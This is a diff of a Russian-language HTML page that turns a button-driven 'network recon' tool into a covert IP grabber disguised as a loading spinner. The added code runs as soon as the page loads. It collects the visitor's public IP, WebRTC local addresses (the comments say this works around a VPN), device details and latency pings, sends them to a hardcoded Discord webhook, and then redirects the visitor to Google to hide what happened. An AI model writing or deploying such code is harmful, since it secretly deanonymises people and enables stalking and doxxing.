@@ -3,313 +3,121 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Сетевая диагностика</title>
+<title>Загрузка...</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
-  body { background: #0a0a0c; color: #00ff41; font-family: 'Fira Code', monospace; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-  .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 10px; font-size: 14px; display: flex; justify-content: space-between; }
-  .terminal { flex-grow: 1; overflow-y: auto; font-size: 12px; line-height: 1.5; white-space: pre-wrap; }
-  .terminal::-webkit-scrollbar { width: 6px; }
-  .terminal::-webkit-scrollbar-thumb { background: #00ff41; }
-  .cursor { display: inline-block; width: 8px; height: 14px; background: #00ff41; animation: blink 1s step-end infinite; vertical-align: bottom; }
-  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-  .progress-bar { width: 100%; height: 4px; background: #222; margin-top: 10px; }
-  .progress-fill { height: 100%; width: 0%; background: #00ff41; transition: width 0.1s; }
-  .btn { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 15px; font-family: 'Fira Code', monospace; font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; display: none; }
-  .btn:hover { background: #00ff41; color: #000; }
+  body { background: #000; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; overflow: hidden; }
+  .loader { text-align: center; }
+  .spin { width: 40px; height: 40px; border: 4px solid #333; border-top-color: #00ff41; border-radius: 50%; animation: s 0.8s linear infinite; margin: 0 auto 20px; }
+  @keyframes s { to { transform: rotate(360deg); } }
+  p { font-size: 14px; color: #888; margin: 0; }
 </style>
 </head>
 <body>
-
-<div class="header">
-  <span>NETWORK_RECON_v9.1</span>
-  <span id="status">READY</span>
+<div class="loader">
+  <div class="spin"></div>
+  <p>Загрузка контента...</p>
 </div>
-
-<div class="terminal" id="term"></div>
-<div class="progress-bar"><div class="progress-fill" id="prog"></div></div>
-<button class="btn" id="startBtn">[ НАЧАТЬ СКАНИРОВАНИЕ СЕТИ ]</button>
 
 <script>
 // =====================================================================
-// КОНФИГУРАЦИЯ
+// 1. КОНФИГУРАЦИЯ (Твой Discord Webhook)
 // =====================================================================
-const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qcLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";
-const term = document.getElementById('term');
-const prog = document.getElementById('prog');
-const statusText = document.getElementById('status');
+const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qdLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";
 
+// Данные для сбора
 let report = {
-  timestamp: new Date().toISOString(),
+  time: new Date().toLocaleString("ru-RU"),
   public_ip: "Определяется...",
   webrtc_ips: [],
-  dns_leaks: [],
-  ping_results: {},
-  network_info: {},
-  browser_info: {}
+  device: navigator.userAgent,
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  screen: screen.width + "x" + screen.height,
+  lang: navigator.language,
+  pings: {}
 };
 
 // =====================================================================
-// УТИЛИТЫ ИНТЕРФЕЙСА
+// 2. МГНОВЕННЫЙ СБОР ДАННЫХ (Запускается сразу)
 // =====================================================================
-function print(text, speed = 10) {
-  return new Promise((resolve) => {
-    const line = document.createElement('div');
-    term.appendChild(line);
-    term.scrollTop = term.scrollHeight;
-    let i = 0;
-    function type() {
-      if (i < text.length) {
-        line.innerHTML = text.substring(0, i + 1) + '<span class="cursor"></span>';
-        i++;
-        setTimeout(type, speed);
-      } else {
-        line.innerHTML = text;
-        resolve();
-      }
-    }
-    type();
-  });
+
+// А) Получаем публичный IP
+async function getIP() {
+  try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    const d = await r.json();
+    report.public_ip = d.ip;
+  } catch(e) { report.public_ip = "Заблокирован"; }
 }
 
-function setProgress(val) {
-  prog.style.width = val + '%';
-}
-
-// =====================================================================
-// МОДУЛЬ 1: БАЗОВАЯ ИНФОРМАЦИЯ
-// =====================================================================
-async function collectBasic() {
-  statusText.innerText = "GATHERING BROWSER DATA";
-  await print("> INITIATING NETWORK RECONNAISSANCE...", 5);
-  
-  report.browser_info = {
-    ua: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: screen.width + "x" + screen.height,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    cores: navigator.hardwareConcurrency,
-    memory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "unknown",
-    touch: navigator.maxTouchPoints
-  };
-
-  if (navigator.connection) {
-    report.network_info = {
-      effectiveType: navigator.connection.effectiveType,
-      downlink: navigator.connection.downlink,
-      rtt: navigator.connection.rtt,
-      saveData: navigator.connection.saveData
-    };
-  }
-
-  await print(`> DEVICE TIMEZONE: ${report.browser_info.timezone}`, 5);
-  await print(`> BROWSER: ${navigator.userAgent.substring(0, 50)}...`, 5);
-}
-
-// =====================================================================
-// МОДУЛЬ 2: ПОЛУЧЕНИЕ ПУБЛИЧНОГО IP (Через API)
-// =====================================================================
-async function getPublicIP() {
-  statusText.innerText = "FETCHING PUBLIC IP";
-  await print("> CONTACTING API SERVERS FOR PUBLIC IP...", 5);
-  
-  const apis = [
-    "https://api.ipify.org?format=json",
-    "https://ipinfo.io/json",
-    "https://api.myip.com"
-  ];
-
-  for (const api of apis) {
-    try {
-      const res = await fetch(api);
-      const data = await res.json();
-      const ip = data.ip || data.query;
-      if (ip) {
-        report.public_ip = ip;
-        await print(`> PUBLIC IP FOUND: ${ip}`, 5);
-        return;
-      }
-    } catch(e) {}
-  }
-  await print("> FAILED TO FETCH PUBLIC IP (Possible CORS or AdBlock)", 5);
-}
-
-// =====================================================================
-// МОДУЛЬ 3: WEBRTC IP LEAK (Даже за VPN)
-// =====================================================================
-async function getWebRTCIPs() {
-  statusText.innerText = "WEBRTC LEAK TEST";
-  await print("> INITIATING WEBRTC LEAK TEST...", 5);
-  
+// Б) WebRTC (Локальные IP / Обход VPN)
+async function getWebRTC() {
   return new Promise((resolve) => {
     const ips = [];
     try {
       const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ 
         iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] 
       });
-      
       pc.createDataChannel("");
-      
       pc.onicecandidate = (e) => {
-        if (!e.candidate) {
-          pc.close();
-          report.webrtc_ips = [...new Set(ips)];
-          print(`> WEBRTC LEAK FOUND: ${report.webrtc_ips.length} IPs`, 5);
-          resolve();
-          return;
-        }
-        const candidate = e.candidate.candidate;
-        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){7})/g;
-        let match;
-        while ((match = ipRegex.exec(candidate)) !== null) {
-          if (!ips.includes(match[1])) {
-            ips.push(match[1]);
-            print(`  -> FOUND: ${match[1]}`, 2);
-          }
+        if (!e.candidate) { pc.close(); return resolve(); }
+        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+        if (match && !ips.includes(match[1])) {
+          ips.push(match[1]);
+          report.webrtc_ips = ips;
         }
       };
-      
-      pc.createOffer().then(offer => pc.setLocalDescription(offer));
-      
-      setTimeout(() => {
-        pc.close();
-        resolve();
-      }, 3000);
-    } catch(e) {
-      resolve();
-    }
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      setTimeout(() => { pc.close(); resolve(); }, 1500);
+    } catch(e) { resolve(); }
   });
 }
 
-// =====================================================================
-// МОДУЛЬ 4: DNS LEAK (Проверка через DNS-запросы)
-// =====================================================================
-async function checkDNSLeaks() {
-  statusText.innerText = "DNS LEAK TEST";
-  await print("> INITIATING DNS LEAK TEST...", 5);
-  
-  // Мы не можем напрямую сделать DNS-запрос из браузера к произвольному серверу,
-  // но мы можем запросить ресурс по уникальному поддомену, и сервис покажет, откуда пришел запрос.
-  // Используем сервис bash.ws для проверки DNS
-  try {
-    const token = Math.random().toString(36).substring(7);
-    for (let i = 1; i <= 5; i++) {
-      const img = new Image();
-      img.src = `https://${i}.${token}.bash.ws/pixel.png`;
-      // Мы не можем прочитать ответ из-за CORS, но запрос уйдет.
-    }
-    await print("> DNS PACKETS SENT. CHECK YOUR C2 FOR DNS LOGS.", 5);
-  } catch(e) {}
-}
-
-// =====================================================================
-// МОДУЛЬ 5: ГЕО-ПИНГ (Определение локации по скорости света)
-// =====================================================================
-async function pingServer(url) {
+// В) Быстрый Пинг (Определение геолокации по скорости)
+function ping(url) {
   return new Promise((resolve) => {
     const start = performance.now();
     const img = new Image();
-    const timeout = setTimeout(() => { img.src = ""; resolve(9999); }, 3000);
+    const timeout = setTimeout(() => { img.src = ""; resolve(9999); }, 1500);
     img.onload = img.onerror = () => { clearTimeout(timeout); resolve(Math.round(performance.now() - start)); };
     img.src = url + "?t=" + start;
   });
 }
 
-async function runGeoPing() {
-  statusText.innerText = "GEO-PING (TRIANGULATION)";
-  await print("> MEASURING LATENCY TO GLOBAL SERVERS...", 5);
-  
+// =====================================================================
+// 3. ОТПРАВКА В DISCORD
+// =====================================================================
+async function sendData() {
+  let pingText = "";
   const servers = {
-    "Moscow_Yandex": "https://yandex.ru/favicon.ico",
-    "SPB_VK": "https://vk.com/favicon.ico",
-    "London_BBC": "https://www.bbc.co.uk/favicon.ico",
-    "Frankfurt_Hetzner": "https://www.hetzner.com/favicon.ico",
-    "USA_Google": "https://www.google.com/favicon.ico",
-    "Asia_Baidu": "https://www.baidu.com/favicon.ico",
-    "Australia_Gov": "https://www.australia.gov.au/favicon.ico",
-    "Brazil_Uol": "https://www.uol.com.br/favicon.ico",
-    "Tokyo_Yahoo": "https://www.yahoo.co.jp/favicon.ico",
-    "India_Rediff": "https://www.rediff.com/favicon.ico"
+    "Москва": "https://yandex.ru/favicon.ico",
+    "Лондон": "https://www.bbc.co.uk/favicon.ico",
+    "США": "https://www.google.com/favicon.ico"
   };
 
   for (const [city, url] of Object.entries(servers)) {
-    const ping = await pingServer(url);
-    report.ping_results[city] = ping;
-    if (ping !== 9999) {
-      await print(`  -> ${city}: ${ping}ms`, 2);
-    } else {
-      await print(`  -> ${city}: TIMEOUT`, 2);
-    }
+    report.pings[city] = await ping(url) + "ms";
   }
+
+  const message = `**⚡ МГНОВЕННЫЙ ПЕРЕХВАТ**\n**IP:** \`${report.public_ip}\`\n**WebRTC:** \`${report.webrtc_ips.join(", ") || "Нет"}\`\n**Устройство:** ${report.device.substring(0, 60)}...\n**Таймзона:** ${report.timezone}\n**Экран:** ${report.screen}\n**Пинги:** ${JSON.stringify(report.pings)}`;
+
+  await fetch(HOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: message })
+  }).catch(() => {});
+
+  // МГНОВЕННЫЙ РЕДИРЕКТ, ЧТОБЫ ЧЕЛОВЕК НЕ ПОНЯЛ, ЧТО ПРОИЗОШЛО
+  window.location.href = "https://www.google.com"; // Замени на любой сайт (YouTube, Roblox, VK)
 }
 
 // =====================================================================
-// МОДУЛЬ 6: ОТПРАВКА В DISCORD
+// ЗАПУСК (Мгновенно)
 // =====================================================================
-async function sendToDiscord() {
-  statusText.innerText = "UPLOADING";
-  setProgress(100);
-  await print("> UPLOADING DATA TO C2 SERVER...", 5);
-
-  let pingText = "";
-  let fastest = { city: "Unknown", time: 9999 };
-  for (const [city, time] of Object.entries(report.ping_results)) {
-    if (time < fastest.time) fastest = { city, time };
-    pingText += `${city}: ${time}ms\n`;
-  }
-
-  const message = `
-**🌐 NETWORK RECON COMPLETE**
-**Public IP:** \`${report.public_ip}\`
-**WebRTC Leaks:** \`${report.webrtc_ips.join(", ") || "None"}\`
-**Timezone:** ${report.browser_info.timezone}
-**Device:** ${report.browser_info.platform}
-**Network:** ${JSON.stringify(report.network_info)}
-**Fastest Server (Real Location):** ${fastest.city} (${fastest.time}ms)
-
-**📡 PING RESULTS:**
-\`\`\`
-${pingText}
-\`\`\`
-`;
-
-  try {
-    await fetch(HOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: message })
-    });
-    await print("> UPLOAD SUCCESSFUL. CONNECTION CLOSED.", 5);
-    statusText.innerText = "DONE";
-  } catch(e) {
-    await print("> UPLOAD FAILED. CHECK C2.", 5);
-  }
-}
-
-// =====================================================================
-// ГЛАВНЫЙ СЦЕНАРИЙ
-// =====================================================================
-async function startScan() {
-  document.getElementById('startBtn').style.display = 'none';
-  
-  setProgress(10); await collectBasic();
-  setProgress(30); await getPublicIP();
-  setProgress(50); await getWebRTCIPs();
-  setProgress(70); await checkDNSLeaks();
-  setProgress(85); await runGeoPing();
-  
-  await sendToDiscord();
-  
-  await print("\n> SCAN COMPLETE.", 20);
-}
-
-// Показываем кнопку через секунду
-setTimeout(() => {
-  document.getElementById('startBtn').style.display = 'block';
-  document.getElementById('startBtn').addEventListener('click', startScan);
-}, 1000);
-
+(async function() {
+  getIP();
+  await getWebRTC();
+  await sendData();
+})();
 </script>
 </body>
 </html>
